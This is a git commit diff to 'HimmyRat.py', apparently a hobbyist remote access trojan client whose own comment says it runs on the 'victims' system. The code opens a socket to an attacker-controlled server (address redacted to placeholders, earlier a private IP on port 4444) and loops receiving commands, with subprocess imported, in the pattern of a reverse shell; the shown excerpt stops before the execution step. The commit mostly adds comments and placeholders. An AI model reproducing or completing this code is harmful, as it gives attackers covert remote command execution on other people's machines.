dfffcd4adb4d12bd980c18ca064f545a159b7f36
Cameron Ash <94546554+HimmyAsh@users.noreply.github.com>
2023-12-29 10:13:43 -0600

    Update HimmyRat.py

--- HimmyRat.py
+++ HimmyRat.py
@@ -1,15 +1,19 @@
+#this will be what's run on the "victims" system
 import sys
 import socket
 import subprocess
 
-SERVER = "192.168.1.212"
-PORT = 4444
+#server IP addr
+SERVER = "x.x.x.x"
+PORT = xxx
 
+#connecting to Server
 s = socket.socket()
 s.connect((SERVER, PORT))
 msg = s.recv(1024).decode()
 print('[*] server:', msg)
 
+#Informing the server of typed cmd recieved
 while True:
     cmd = s.recv(1024).decode()
     print(f'[+] received command: {cmd}')
